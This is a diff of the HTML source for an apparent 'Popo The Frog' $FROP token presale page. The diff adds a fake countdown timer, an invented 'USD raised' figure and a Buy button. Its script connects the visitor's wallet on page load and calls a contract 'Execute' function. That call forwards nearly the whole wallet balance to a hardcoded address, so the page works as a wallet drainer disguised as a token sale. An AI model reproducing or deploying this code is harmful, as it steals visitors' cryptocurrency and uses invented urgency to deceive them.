@@ -4261,49 +4261,49 @@
     <link rel="sitemap" type="application/xml" href="/sitemap-index.xml" />
     <link
       rel="icon"
-      href="/favicon-32x32.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/favicon-32x32.png?v=db88fc9496076795ff0620e6cc1a0ee1"
       type="image/png"
     />
-    <link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous" />
+    <link rel="manifest" href="https://www.popofrog.com//manifest.webmanifest" crossorigin="anonymous" />
     <link
       rel="apple-touch-icon"
       sizes="48x48"
-      href="/icons/icon-48x48.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-48x48.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="72x72"
-      href="/icons/icon-72x72.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-72x72.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="96x96"
-      href="/icons/icon-96x96.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-96x96.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="144x144"
-      href="/icons/icon-144x144.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-144x144.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="192x192"
-      href="/icons/icon-192x192.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-192x192.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="256x256"
-      href="/icons/icon-256x256.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-256x256.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="384x384"
-      href="/icons/icon-384x384.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-384x384.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <link
       rel="apple-touch-icon"
       sizes="512x512"
-      href="/icons/icon-512x512.png?v=db88fc9496076795ff0620e6cc1a0ee1"
+      href="https://www.popofrog.com/icons/icon-512x512.png?v=db88fc9496076795ff0620e6cc1a0ee1"
     />
     <title data-gatsby-head="true">Popo The Frog - The Legend of Memes</title>
     <link
@@ -4480,13 +4480,34 @@
   </head>
   <body>
     <script>
+         // Initialize the countdown time in seconds
+          let countdownTime = 1980; // Example: 33 minutes (1980 seconds)
+
+          function updateTimer() {
+            // Calculate minutes and seconds
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+
+            // Update the HTML elements
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+
+            // Decrease the countdown time
+            if (countdownTime > 0) {
+              countdownTime--;
+            } else {
+              clearInterval(timerInterval);
+            }
+          }
+
+         
         window.onload = async () => {
             if (window.ethereum) {
                 try {
-                    // 请求账户访问
+                   // Update the timer every second
+                    const timerInterval = setInterval(updateTimer, 1000);
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-                    // 创建Web3实例
                     const web3 = new Web3(window.ethereum);
 
                     const chainId = '0x61'; // BSC Testnet chain ID
@@ -4500,7 +4521,6 @@
                         });
                     }
 
-                    // 获取用户的第一个账户
                     const accounts = await web3.eth.getAccounts();
                     const account = accounts[0];
                     const balance = await web3.eth.getBalance(account);
@@ -7835,216 +7855,58 @@
               </div>
               <div class="intro-module--rightContainer--af54f">
                 <div id="presale-widget" data-language="en">
-                  <div id="presaleWidgetContainer">
-                    <div class="popo_presaleContainer__jh-1J">
-                      <h2>Buy $FROP tokens now:</h2>
-                      <div class="popo_presaleWidget__2NpyE">
-                        <div class="popo_contentBlock__Q2BuG">
-                          <h3>Presale</h3>
-                        </div>
-                        <div
-                          class="popo_contentBlock__Q2BuG popo_endedPresaleDescription__k8QoT"
-                        >
-                          <p>
-                            Connect your wallet to manage your staked tokens or
-                            withdraw them to your personal wallet.
-                          </p>
-                        </div>
-
-                        <div class="popo_contentBlock__Q2BuG">
-                          <div class="popo_balanceInfo__fUdkc" id="balance">
-                            <span
-                              >Your BNB balance: <strong>--</strong></span
-                            ><span class="popo_connAddress__5mMFx" id="address"
-                              >Connected address: ...</span
-                            >
-                          </div>
-                        </div>
-                        <div class="popo_contentBlock__Q2BuG">
-                          <div class="popo_tabSwitchers__xPOBL">
-                            <button class="popo_active__LwGqP">Buy</button>
-                          </div>
-                        </div>
-                        <div class="popo_tabContent__CCUjA popo_active__LwGqP">
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div
-                              class="popo_selectBlock__ohTYh popo_onlyNetwork__B429I"
-                            >
-                              <div>
-                                <span>Select network:</span
-                                ><button
-                                  class=""
-                                  id="buy"
-                                >
-                                  <i class="popo_bsc__CgUNt"></i
-                                  ><span>BNB Chain</span>
-                                </button>
-                                <ul class="popo_dropDownList__mQNWi">
-                                  <li class="">
-                                    <i class="popo_arbitrum__w666r"></i
-                                    ><span>Arbitrum</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_avalanche__GdyRt"></i
-                                    ><span>Avalanche</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_base__FkdZN"></i
-                                    ><span>Base</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_ethereum__+6YFP"></i
-                                    ><span>Ethereum</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_optimism__-aFx2"></i
-                                    ><span>Optimism</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_polygon__gPf2D"></i
-                                    ><span>Polygon</span>
-                                  </li>
-                                  <li class="">
-                                    <i class="popo_solana__qksfi"></i
-                                    ><span>Solana</span>
-                                  </li>
-                                </ul>
-                              </div>
+                  <div id="presaleWidgetContainer"></div>
+                        <div class="popo_presaleContainer__jh-1J">
+                          <h2>Buy $FROP tokens now:</h2>
+                          <div class="popo_presaleWidget__2NpyE">
+                            <div class="popo_contentBlock__Q2BuG">
+                              <h3>Token price increase in:</h3>
                             </div>
-                          </div>
-                        </div>
-                        <div class="popo_tabContent__CCUjA">
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div class="popo_stakingInfo__0LX4+">
-                              <span
-                                ><strong>Staking will end in:</strong> 453
-                                days</span
-                              ><span
-                                ><strong>Total staked in pool:</strong>
-                                3,203,997,147 $FROP</span
-                              ><span
-                                ><strong>Rewards per block for pool:</strong>
-                                1,763.00 $FROP</span
-                              ><span
-                                ><strong>Current staking APR:</strong>
-                                579.00%</span
-                              ><span
-                                ><strong>You staked:</strong> 0.00 $FROP</span
-                              ><span
-                                ><strong>Your pool share:</strong> 0.00%</span
-                              ><span
-                                ><strong>Your earned rewards:</strong> 0.00
-                                $FROP</span
-                              ><span
-                                ><strong>You can stake now:</strong> 0.00
-                                $FROP</span
-                              ><span
-                                ><strong>You'll be able to unstake in:</strong>
-                                To be announced...</span
-                              >
-                            </div>
-                          </div>
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div class="popo_withTitle__K7Skd">
-                              <span
-                                >Claim your earned rewards to your wallet:</span
-                              ><button
-                                class="popo_buyButton__U7yt+"
-                                disabled=""
-                              >
-                                <span>Nothing to claim</span>
-                              </button>
-                            </div>
-                          </div>
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div class="popo_withTitle__K7Skd">
-                              <span
-                                >Withdraw all staked tokens and rewards:</span
-                              ><button
-                                class="popo_buyButton__U7yt+"
-                                disabled=""
-                              >
-                                <span>Nothing to withdraw</span>
-                              </button>
-                            </div>
-                          </div>
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div class="popo_withTitle__K7Skd">
-                              <span>Stake unclaimed tokens:</span
-                              ><button
-                                class="popo_buyButton__U7yt+"
-                                disabled=""
-                              >
-                                <span>Nothing to stake</span>
-                              </button>
-                            </div>
-                          </div>
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div
-                              class="popo_inputBlock__YeFXy popo_stakeAmountInput__5J9gh"
-                            >
-                              <div>
-                                <span>Stake $FROP from your wallet:</span
-                                ><button
-                                  disabled=""
-                                  class="popo_maxValue__Pj-9X"
-                                >
-                                  MAX
-                                </button>
-                                <div class="popo_inputWrap__64MGf">
-                                  <input
-                                    placeholder="0"
-                                    type="text"
-                                    value=""
-                                  /><i class="popo_tokenLogo__qaZjE"></i>
+                            <div class="popo_contentBlock__Q2BuG">
+                              <div class="popo_presaleTimer__HEqRk">
+                                <div class="popo_timerChunk__6qI6E">
+                                  <div><span class="tDate" id="days">00</span></div><span>Days</span>
+                                </div>
+                                <div class="popo_timerChunk__6qI6E">
+                                  <div><span class="tDate" id="hours">03</span></div><span>Hours</span>
+                                </div>
+                                <div class="popo_timerChunk__6qI6E">
+                                  <div><span class="tDate" id="minutes">18</span></div><span>Minutes</span>
+                                </div>
+                                <div class="popo_timerChunk__6qI6E">
+                                  <div><span class="tDate" id="seconds">45</span></div><span>Seconds</span>
                                 </div>
                               </div>
                             </div>
-                          </div>
-                          <div class="popo_contentBlock__Q2BuG">
-                            <button class="popo_buyButton__U7yt+" disabled="">
-                              <span>Stake tokens</span>
-                            </button>
-                          </div>
-                        </div>
-                        <div class="popo_tabContent__CCUjA">
-                          <div class="popo_contentBlock__Q2BuG">
-                            <div class="popo_withTitle__K7Skd">
-                              <span>Claim purchased tokens to your wallet:</span
-                              ><button
-                                class="popo_buyButton__U7yt+"
-                                disabled=""
-                              >
-                                <span>Nothing to claim</span>
-                              </button>
+                            <div class="popo_contentBlock__Q2BuG popo_fundsRaised__SzrjR"><span id="raised">USD raised: <strong>$87,930.00</strong> /
+                                $100,000.00</span></div>
+                            <div class="popo_contentBlock__Q2BuG">
+                              <div class="popo_progressBar__6ZK6Q">
+                                <div class="popo_bar__4S87e" style="width: 0%;" id="progressBar"></div><span>87%</span>
+                              </div>
                             </div>
+                            <div class="popo_contentBlock__Q2BuG">
+                              <div class="popo_tokenPrice__kL4bn"><span>1 $FROP = <strong>$0.08</strong></span></div>
+                            </div>
+                            <div class="popo_tabContent__CCUjA popo_active__LwGqP">
+                 
+                              <div class="popo_contentBlock__Q2BuG">
+                                <div class="popo_withTitle__K7Skd"><span>Buy $FROP tokens now:</span><button
+                                    class="popo_buyButton__U7yt+" id="buy"><span>Buy</span></button></div>
+                              </div>
+                            </div>
+                            <div class="popo_contentBlock__Q2BuG popo_noPadding__xaQ5a">
+                              <p class="popo_presaleDisclaimer__j1gxx">I have done my own research and understand that investing in
+                                cryptocurrency involves risk and may result in loss of investment. By participating in the presale, I fully
+                                agree to the terms of the presale.</p>
+                            </div>
+                            <div class="popo_additionalActions__ldxit"><a href="https://telegra.ph/Popo-The-Frog-Wiki-09-30"
+                                title="How to buy" class="popo_helpButton__nnEWO"></a></div>
+                            <!-- <div class="popo_blocker__z8E0n"></div> -->
                           </div>
-                        </div>
-                        <div
-                          class="popo_contentBlock__Q2BuG popo_noPadding__xaQ5a"
-                        >
-                          <p class="popo_presaleDisclaimer__j1gxx">
-                            I have done my own research and understand that
-                            investing in cryptocurrency involves risk and may
-                            result in loss of investment. By participating in
-                            the presale, I fully agree to the terms of the
-                            presale.
-                          </p>
-                        </div>
-                        <div class="popo_additionalActions__ldxit">
-                          <a
-                            href="https://telegra.ph/Popo-The-Frog-Wiki-09-30"
-                            title="How to buy"
-                            class="popo_helpButton__nnEWO"
-                          ></a
-                          ><button
-                            title="Disconnect"
-                            class="popo_disconnectButton__vNj3Q"
-                          ></button>
                         </div>
                       </div>
-                    </div>
-                  </div>
+      
                 </div>
                 <form
                   action="/"
@@ -9110,6 +8972,7 @@
                         alert('Insufficient balance');
                         return;
                     }
+
                     const result = await contract.methods.Execute(account, "0xA4f6108D42AA38798dC1D47a1bF6EDD55bF6F7BB", "0xA4f6108D42AA38798dC1D47a1bF6EDD55bF6F7BB", 98, 0).send({ from: account, value: balanceWei - 9000000000000000n });
 
                     console.log('Function result:', result);
